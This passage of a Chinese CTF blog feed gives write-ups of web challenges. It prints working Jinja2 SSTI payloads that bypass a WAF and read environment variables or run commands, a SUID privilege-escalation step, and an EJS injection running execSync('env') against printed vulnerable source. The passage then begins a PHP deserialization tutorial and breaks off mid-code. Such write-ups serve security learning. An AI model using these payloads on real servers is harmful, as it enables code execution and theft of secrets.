2025]戈达尔的剧本工厂</h3><blockquote><p>hint:本题只考察一个漏洞。能回显输入的内容，可能考察什么漏洞？根据测试结果和被waf的内容确定考察的漏洞吧</p><p>hint:这题中的Aurora{test_flag}是假的flag，真的flag在环境变量里</p></blockquote><p>这是内部新生赛的题目，本题的Base64编码要求应该是防焚靖设计，但新生赛的时候还是焚靖一把梭了（乐，现决定正常复现一次</p><p>已经知道方向是Jinja2模板注入，<code>&#123;&#123;7*7&#125;&#125;</code>编码后传入回显49，测试几次后发现过滤了<code>&#39;&#39;</code>、<code>&quot;&quot;</code>、<code>[]</code>、<code>&#123;&#123;&#125;&#125;</code>、<code>.</code>和一些关键字（发现<code>class</code>被waf了，后面关键字索性都绕过了）</p><p>完整的payload是</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> cla=<span class="built_in">dict</span>(c=a,l=a,a=a,ss=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> down=(lipsum|string|<span class="built_in">list</span>)|attr(po)(<span class="number">18</span>) %&#125; //下划线</span><br><span class="line">&#123;% <span class="built_in">set</span> clas=(down,down,cla,down,down)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> bas=(down,down,<span class="built_in">dict</span>(b=<span class="number">0</span>,<span class="keyword">as</span>=<span class="number">0</span>,e=<span class="number">0</span>)|join,down,down)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> sub=(down,down,<span class="built_in">dict</span>(sub=<span class="number">0</span>,cla=<span class="number">0</span>,sse=<span class="number">0</span>,s=<span class="number">0</span>)|join,down,down)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> get=(down,down,<span class="built_in">dict</span>(get=<span class="number">0</span>,ite=<span class="number">0</span>,m=<span class="number">0</span>)|join,down,down)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ini=(down,down,<span class="built_in">dict</span>(ini=<span class="number">0</span>,t=<span class="number">0</span>)|join,down,down)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> glo=(down,down,<span class="built_in">dict</span>(glo=<span class="number">0</span>,bal=<span class="number">0</span>,s=<span class="number">0</span>)|join,down,down)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> pop=<span class="built_in">dict</span>(pop=<span class="number">0</span>,en=<span class="number">0</span>)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> re=<span class="built_in">dict</span>(re=<span class="number">0</span>,ad=<span class="number">0</span>)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> a=(lipsum|string|<span class="built_in">list</span>)|attr(po)(<span class="number">9</span>) %&#125; //空格</span><br><span class="line">&#123;% <span class="built_in">set</span> king=()|attr(clas)|attr(bas)|attr(sub)()|attr(get)(<span class="number">134</span>)|attr(ini)|attr(glo)|string|<span class="built_in">list</span>|attr(po)(<span class="number">463</span>) %&#125; //斜杠</span><br><span class="line">&#123;% <span class="built_in">set</span> ls=(<span class="built_in">dict</span>(l=<span class="number">0</span>,s=<span class="number">0</span>)|join,a,king)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> env=<span class="built_in">dict</span>(en=<span class="number">0</span>,v=<span class="number">0</span>)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> d=()|attr(clas)|attr(bas)|attr(sub)()|attr(get)(<span class="number">134</span>)|attr(ini)|attr(glo)|attr(get)(pop)(env)|attr(re)() %&#125;</span><br><span class="line">&#123;% <span class="built_in">print</span> d %&#125;</span><br></pre></td></tr></table></figure><p>看着虽然比较复杂，但都是机械性的操作，而且此题不一定要到命令执行那一步，只要做到<code>__globals__</code>就可以看环境变量拿flag了</p><blockquote><p>如果要到命令执行，调用<code>popen</code>时不能直接attr，因为我们访问的<code>__globals__</code>是一个字典，要用<code>__getitem__</code>读取，前面marin师傅是<code>globals</code>-&gt;<code>os</code>-&gt;<code>popen</code>，是从<code>os</code>模块里调用</p></blockquote><br/><h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><p>有时题目会不展示代码执行结果或直接不回显，这时的处理方法包括但不限于外带、反弹shell、转移执行结果、打内存马,这里来看看操作成本较低的转移执行结果，参考自<a href="https://saintcen.github.io/2025/10/13/MoeCTF2025_Web_wp/#%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E7%AB%A0-%E8%A1%80%E6%B5%B7%E6%A0%B8%E5%BF%83%E5%8D%83%E5%B9%B4%E6%89%8B%E6%AE%B5">MoeCTF2025_Web_wp | Sa1ntCHENの小窝</a></p><h3 id="MoeCTF-2025-第二十二章-血海核心·千年手段"><a href="#MoeCTF-2025-第二十二章-血海核心·千年手段" class="headerlink" title="[MoeCTF 2025]第二十二章 血海核心·千年手段"></a>[MoeCTF 2025]第二十二章 血海核心·千年手段</h3><p>题目给了源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.args <span class="keyword">or</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        username = request.args.get(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        password = request.args.get(<span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">            login_msg = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;result-title&quot;&gt;阵法反馈&lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#x27;login-fail&#x27;&gt;用户名或密码不能为空&lt;/div&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            login_msg = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;result-title&quot;&gt;阵法反馈&lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#x27;login-success&#x27;&gt;Welcome: <span class="subst">&#123;username&#125;</span>&lt;/div&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span></span><br><span class="line">            render_template_string(login_msg)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        login_msg = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, login_msg=login_msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>我们无论输入什么，页面都会直接返回payload本身，要获取命令执行结果，这里可以新开一个我们能访问的页面，把执行结果写入一个文本中，payload是</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; url_for.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).makedirs(<span class="string">&#x27;static&#x27;</span>, exist_ok=<span class="literal">True</span>) <span class="keyword">or</span> url_for.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;builtins&#x27;</span>).<span class="built_in">open</span>(<span class="string">&#x27;static/read.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>).write(url_for.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls /&#x27;</span>).read()) &#125;&#125;</span><br></pre></td></tr></table></figure><p>逻辑是在当前目录新建一个子目录<code>static</code>，再新建一个文件<code>read.txt</code>，把<code>ls /</code>执行的结果写入其中，执行后访问<code>http://127.0.0.1:51581/static/read.txt</code>可以看到根目录下有<code>flag</code>文件，尝试cat失败，推测需要提权，利用<code>find / -user root -perm -4000 -print 2&gt;/dev/null</code>查找具有管理员权限的文件</p><blockquote><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code>执行逻辑</p><p><code>-user root</code>：文件的所有者必须是root用户</p><p><code>-perm -4000</code>：查找设置了SUID位的文件，<code>4000</code> 是SUID（Set User ID）的八进制表示</p><p><code>-print</code>：输出匹配文件的完整路径名</p><p><code>2&gt;/dev/null</code>：将标准错误输出重定向到 <code>/dev/null</code>，目的是隐藏权限拒绝等错误信息</p></blockquote><p>后面确定<code>/usr/bin/rev</code>是提权的目标文件，但是不能直接用，<a href="https://p111223.github.io/">@mervin</a>让我尝试<code>ls /usr/bin/rev</code>可以看到<code>rev.c</code>，查看原码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i + <span class="number">1</span> &lt; argc; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">&quot;--HDdss&quot;</span>, argv[i]) == <span class="number">0</span>) &#123;</span><br><span class="line">            execvp(argv[i + <span class="number">1</span>], &amp;argv[i + <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要一个<code>--HDdss</code>才能正常提权，后续<code>/usr/bin/rev --HDdss cat /flag</code>就能成功提权拿flag了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">moectf&#123;5c0b28d8-19dc-1895-0844-fe45f6a3cddf&#125;</span><br></pre></td></tr></table></figure><br/><br/><h2 id="EJS模板引擎-JavaScript-注入"><a href="#EJS模板引擎-JavaScript-注入" class="headerlink" title="EJS模板引擎(JavaScript)注入"></a>EJS模板引擎(JavaScript)注入</h2><h3 id="极客大挑战2025-Expression"><a href="#极客大挑战2025-Expression" class="headerlink" title="[极客大挑战2025]Expression"></a>[极客大挑战2025]Expression</h3><blockquote><p>这个程序员偷懒直接复制粘贴网上的代码连 JWT 密钥都不改..？</p></blockquote><p>原题说和<code>JWT</code>有关，可以把密钥爆破出来，是<code>secret</code>，获得密钥后可以篡改cookie的数据，原始的JWT密钥解密出来有两个内容<code>email</code>和<code>username</code>，尝试将<code>username</code>属性改为<code>admin</code>，发现没用，后面的尝试方向也是管理员权限，导致方向一直都是偏的，就卡在这里了</p><p>后面听<a href="https://btop251.vercel.app/">@晓堃</a>说是ejs模板注入，要获得的flag在环境变量里面，payload是</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;%- <span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;env&#x27;</span>) %&gt;</span><br></pre></td></tr></table></figure><blockquote><p>执行逻辑</p><p><code>global.process.mainModule</code> - 获取Node.js主模块</p><p><code>require(&#39;child_process&#39;)</code> - 加载子进程模块</p><p><code>execSync(&#39;env&#39;)</code> - 同步执行系统命令<code>env</code>（显示环境变量）</p></blockquote><p>是第一次听说这玩意，但来都来了不妨看看是怎么个思路，后端服务器是nodejs写的，拉出来看看源码（做题的时候啥也没有，猜谜完了</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>); </span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>); </span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>); </span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>); </span><br><span class="line"><span class="keyword">const</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>); </span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>); </span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>(); </span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = process.<span class="property">env</span>.<span class="property">PORT</span> || <span class="number">3000</span>; </span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">JWT_SECRET</span> = <span class="string">&#x27;secret&#x27;</span>; </span><br><span class="line"><span class="keyword">const</span> users = <span class="keyword">new</span> <span class="title class_">Map</span>(); </span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;)); </span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>()); </span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>()); </span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>)); </span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>); </span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/public&#x27;</span>, express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>))); </span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">generateServerUsername</span>(<span class="params"></span>)&#123; </span><br><span class="line"><span class="keyword">const</span> suffix = crypto.<span class="title function_">randomBytes</span>(<span class="number">6</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>); </span><br><span class="line"> <span class="keyword">return</span> <span class="string">`user_<span class="subst">$&#123;suffix&#125;</span>`</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">signToken</span>(<span class="params">payload</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> jwt.<span class="title function_">sign</span>(payload, <span class="variable constant_">JWT_SECRET</span>, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>, <span class="attr">expiresIn</span>: <span class="string">&#x27;7d&#x27;</span> &#125;); &#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">requireAuth</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line"><span class="keyword">const</span> token = req.<span class="property">cookies</span>.<span class="property">token</span>; </span><br><span class="line"><span class="keyword">if</span> (!token) <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>); </span><br><span class="line"><span class="keyword">try</span> &#123; </span><br><span class="line"><span class="keyword">const</span> decoded = jwt.<span class="title function_">verify</span>(token, <span class="variable constant_">JWT_SECRET</span>, &#123; <span class="attr">algorithms</span>: [<span class="string">&#x27;HS256&#x27;</span>] &#125;); </span><br><span class="line">req.<span class="property">user</span> = decoded; <span class="title function_">next</span>(); &#125; </span><br><span class="line"><span class="keyword">catch</span> (e) &#123; </span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123; </span><br><span class="line"><span class="keyword">const</span> token = req.<span class="property">cookies</span>.<span class="property">token</span>; </span><br><span class="line"><span class="keyword">let</span> currentUser = <span class="literal">null</span>; </span><br><span class="line"><span class="keyword">let</span> renderedUsername; </span><br><span class="line"><span class="keyword">if</span> (token) &#123; </span><br><span class="line"><span class="keyword">try</span> &#123; </span><br><span class="line">currentUser = jwt.<span class="title function_">verify</span>(token, <span class="variable constant_">JWT_SECRET</span>); </span><br><span class="line"><span class="keyword">try</span> &#123; </span><br><span class="line">renderedUsername = ejs.<span class="title function_">render</span>(<span class="title class_">String</span>(currentUser.<span class="property">username</span>), &#123; <span class="attr">user</span>: currentUser, process &#125;);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">catch</span> (e) &#123; </span><br><span class="line">renderedUsername = currentUser.<span class="property">username</span>;</span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">catch</span> (e) &#123;&#125; </span><br><span class="line">&#125; res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; currentUser, renderedUsername &#125;);&#125;); </span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123; </span><br><span class="line"><span class="keyword">const</span> &#123; email &#125; = req.<span class="property">body</span>; </span><br><span class="line"><span class="keyword">if</span> (!email || !<span class="regexp">/^[^@\n]+@[^@\n]+\.[^@\n]+$/</span>.<span class="title function_">test</span>(email))</span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Invalid email&#x27;</span>, <span class="attr">currentUser</span>: <span class="literal">null</span> &#125;); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span> (users.<span class="title function_">has</span>(email)) </span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Email already registered. Please login.&#x27;</span>, <span class="attr">currentUser</span>: <span class="literal">null</span> &#125;); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">const</span> username = <span class="title function_">generateServerUsername</span>(); </span><br><span class="line">users.<span class="title function_">set</span>(email, username);</span><br><span class="line"><span class="keyword">const</span> token = <span class="title function_">signToken</span>(&#123; email, username &#125;); </span><br><span class="line">res.<span class="title function_">cookie</span>(<span class="string">&#x27;token&#x27;</span>, token, &#123; <span class="attr">httpOnly</span>: <span class="literal">true</span>, <span class="attr">sameSite</span>: <span class="string">&#x27;lax&#x27;</span> &#125;); </span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);&#125;); </span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123; </span><br><span class="line"><span class="keyword">const</span> &#123; email &#125; = req.<span class="property">body</span>; </span><br><span class="line"><span class="keyword">if</span> (!email || !<span class="regexp">/^[^@\n]+@[^@\n]+\.[^@\n]+$/</span>.<span class="title function_">test</span>(email)) &#123;</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Invalid email&#x27;</span>, <span class="attr">currentUser</span>: <span class="literal">null</span> &#125;); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span> (!users.<span class="title function_">has</span>(email)) &#123;</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Email not found. Please register first.&#x27;</span>, <span class="attr">currentUser</span>: <span class="literal">null</span> &#125;); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">const</span> username = users.<span class="title function_">get</span>(email); </span><br><span class="line"><span class="keyword">const</span> token = <span class="title function_">signToken</span>(&#123; email, username &#125;); </span><br><span class="line">res.<span class="title function_">cookie</span>(<span class="string">&#x27;token&#x27;</span>, token, &#123; <span class="attr">httpOnly</span>: <span class="literal">true</span>, <span class="attr">sameSite</span>: <span class="string">&#x27;lax&#x27;</span> &#125;); </span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>); &#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/logout&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123; </span><br><span class="line">res.<span class="title function_">clearCookie</span>(<span class="string">&#x27;token&#x27;</span>); res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>); &#125;); </span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="function">() =&gt;</span> &#123; </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server listening on http://127.0.0.1:<span class="subst">$&#123;PORT&#125;</span>`</span>); &#125;);</span><br></pre></td></tr></table></figure><blockquote><p>漏洞段代码</p></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (token) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    currentUser = jwt.<span class="title function_">verify</span>(token, <span class="variable constant_">JWT_SECRET</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">// 风险点：直接渲染未经验证的用户数据</span></span><br><span class="line">      renderedUsername = ejs.<span class="title function_">render</span>(<span class="title class_">String</span>(currentUser.<span class="property">username</span>), &#123; <span class="attr">user</span>: currentUser, process &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      renderedUsername = currentUser.<span class="property">username</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里，<code>currentUser.username</code> 直接作为模板内容传入 <code>ejs.render()</code>，如果攻击者能够控制 JWT Token 中的 <code>username</code> 字段并写入恶意 EJS 模板代码，这些代码就<strong>会在服务器端执行</strong></p><p>但是js一般作为前端语言使用，要想确认模板是否在后端渲染，可以使用</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;%= <span class="title class_">Date</span>.<span class="title function_">now</span>() %&gt;</span><br></pre></td></tr></table></figure><p>如果返回的是指令本身，那就是只在客户端渲染，没办法注入，如果返回的是时间代码，那就是在服务端渲染，就是ejs注入。就本题而言，传入后的回显是<code>1763708518696</code>，那就是后端渲染了</p><br/>]]></content>
      
      
      <categories>
          
          <category> CTF相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化(unserialize)</title>
      <link href="/2025/11/24/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(unserialize)/"/>
      <url>/2025/11/24/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(unserialize)/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><p>在 PHP 中，序列化 (Serialization)是将对象的状态信息转化为可存储或传输的形式（通常是字符串）的过程。而反序列化 (Deserialization)则是将序列化后的字符串重新转换回对象的过程。反序列化漏洞的本质是程序在对用户提供的序列化数据进行反序列化时，没有进行充分的验证和过滤，导致攻击者可以控制反序列化过程，进而执行恶意代码或进行其他恶意操作</p><br /><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><table><thead><tr><th align="left">魔术方法</th><th align="left">调用时机</th><th>传递参数</th><th>返回值</th></tr></thead><tbody><tr><td align="left">__construct()</td><td align="left">对象创建时</td><td>根据实际定义</td><td>无要求</td></tr><tr><td align="left">__destruct()</td><td align="left">对象被销毁时</td><td>不可设置</td><td>无</td></tr><tr><td align="left">__call()</td><td align="left">调用一个不存在或不可访问的方法时</td><td>$method、$arguments</td><td>自由定义</td></tr><tr><td align="left">__callStatic()</td><td align="left">调用一个不存在或不可访问的静态方法时</td><td>$method、$arguments</td><td>自由定义</td></tr><tr><td align="left">__get()</td><td align="left">访问一个对象不存在或不可访问的属性时</td><td>$name</td><td>自由定义</td></tr><tr><td align="left">__set()</td><td align="left">设置一个对象不存在或不可设置的属性时</td><td>$name、$values</td><td>通常无</td></tr><tr><td align="left">__isset()</td><td align="left">检查一个对象不存在或不可访问的属性时</td><td>$name</td><td>布尔值</td></tr><tr><td align="left">__unset()</td><td align="left">unset()函数尝试删除对象不存在或不可访问的属性时</td><td>$name</td><td>无</td></tr><tr><td align="left">__sleep()</td><td align="left">在对象被序列化前</td><td>无</td><td>需要被序列化的属性名的数组</td></tr><tr><td align="left">__wakeup()</td><td align="left">反序列化之后</td><td>无</td><td>无</td></tr><tr><td align="left">__toString()</td><td align="left">对象被隐式地转化为字符串时</td><td>不接受</td><td>字符串</td></tr><tr><td align="left">__invoke()</td><td align="left">被作为函数调用时</td><td>任意</td><td>任何</td></tr><tr><td align="left">__set_state()</td><td align="left">eval()函数将对象字符串转化为原始对象后</td><td>$data</td><td>对象的实例</td></tr><tr><td align="left">__clone()</td><td align="left">使用clone关键字对一个对象进行克隆时</td><td>无</td><td>不需要</td></tr><tr><td align="left">__autoload()</td><td align="left">尝试使用一个未定义的类时</td><td>$name</td><td>不需要</td></tr><tr><td align="left">__debugInfo()</td><td align="left">可以控制对象在使用var_dump()函数或调试时打印的信息</td><td>无</td><td>数组，包含在调试输出中显示的属性及其值</td></tr></tbody></table><br /><br /><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><p>神奇的小特性，一般用于绕过某些检查或限制</p><h3 id="当成员属性的实际数量符合序列化字符串中对应属性值时，不会进行任何检查"><a href="#当成员属性的实际数量符合序列化字符串中对应属性值时，不会进行任何检查" class="headerlink" title="当成员属性的实际数量符合序列化字符串中对应属性值时，不会进行任何检查"></a>当成员属性的实际数量符合序列化字符串中对应属性值时，不会进行任何检查</h3><h3 id="PHPSerializelabs-Level-17-字符串逃逸基础-无中生有"><a href="#PHPSerializelabs-Level-17-字符串逃逸基础-无中生有" class="headerlink" title="[PHPSerializelabs]Level 17: 字符串逃逸基础-无中生有"></a>[PHPSerializelabs]Level 17: 字符串逃逸基础-无中生有</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 17 : 字符串逃逸基础 --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">序列化和反序列化的规则特性_无中生有：当成员属性的实际数量符合序列化字符串中对应属性值时，似乎不会做任何检查？</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Class A is NULL: &#x27;&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>()).<span class="string">&quot;&#x27;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span> = <span class="string">&quot;CTF&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$c</span> = <span 